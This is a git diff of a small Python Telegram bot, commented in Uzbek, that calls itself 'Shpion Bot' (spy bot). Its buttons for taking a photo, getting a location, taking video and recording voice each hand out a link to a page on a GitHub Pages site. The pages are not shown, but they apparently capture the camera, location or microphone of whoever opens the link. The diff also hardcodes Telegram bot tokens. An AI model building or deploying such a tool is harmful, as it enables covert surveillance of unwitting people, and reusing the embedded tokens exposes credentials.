@@ -1,30 +1,37 @@
 import telebot
 from telebot import types
 
-TOKEN = '8309793843:AAEBOeMZ7h2QZKZYiz449-fvXthdjTGHtSY'
+# Bot tokeningiz
+TOKEN = '3309793843:AAEBOeMZ7h2QZKZY1Z449-fvXthdjT6HTSY'
 bot = telebot.TeleBot(TOKEN)
-URL = "https://nodirbekabdimurodov2-design.github.io/Shipyombot" # Buni keyinroq to'g'irlaymiz
+
+# GitHub Pages havolangiz
+URL = "https://nodirbekabdimurodov2-design.github.io/Shipyombot"
 
 @bot.message_handler(commands=['start'])
 def start(m):
     kb = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
-    btn1 = types.KeyboardButton("📸 Rasm olish")
-    btn2 = types.KeyboardButton("📍 Lokatsiya olish")
-    btn3 = types.KeyboardButton("🎥 Video olish")
-    btn4 = types.KeyboardButton("🎵 Ovoz yozish")
-    kb.add(btn1, btn2, btn3, btn4)
+    bts1 = types.KeyboardButton("📸 Rasm olish")
+    bts2 = types.KeyboardButton("📍 Lokatsiya olish")
+    bts3 = types.KeyboardButton("🎥 Video olish")
+    bts4 = types.KeyboardButton("🎵 Ovoz yozish")
+    kb.add(bts1, bts2, bts3, bts4)
     bot.send_message(m.chat.id, "✅ Shpion Bot ishga tushdi. Tugmani bosing:", reply_markup=kb)
 
 @bot.message_handler(func=lambda m: True)
 def handle_message(m):
     if m.text == "📸 Rasm olish":
-        bot.send_message(m.chat.id, f"Havola: {URL}/photo.html")
+        # index.html fayliga yo'naltirish
+        bot.send_message(m.chat.id, f"Havola: {URL}/index.html")
     elif m.text == "📍 Lokatsiya olish":
-        bot.send_message(m.chat.id, f"Havola: {URL}/loc.html")
+        # index-1.html fayliga yo'naltirish
+        bot.send_message(m.chat.id, f"Havola: {URL}/index-1.html")
     elif m.text == "🎥 Video olish":
-        bot.send_message(m.chat.id, f"Havola: {URL}/video.html")
+        # index-2.html fayliga yo'naltirish
+        bot.send_message(m.chat.id, f"Havola: {URL}/index-2.html")
     elif m.text == "🎵 Ovoz yozish":
-        bot.send_message(m.chat.id, f"Havola: {URL}/audio.html")
+        # Ovoz yozish uchun alohida html yo'qligi sababli photo'ga yo'naltiramiz
+        bot.send_message(m.chat.id, f"Havola: {URL}/index.html")
 
 bot.polling(none_stop=True)
-
+ 
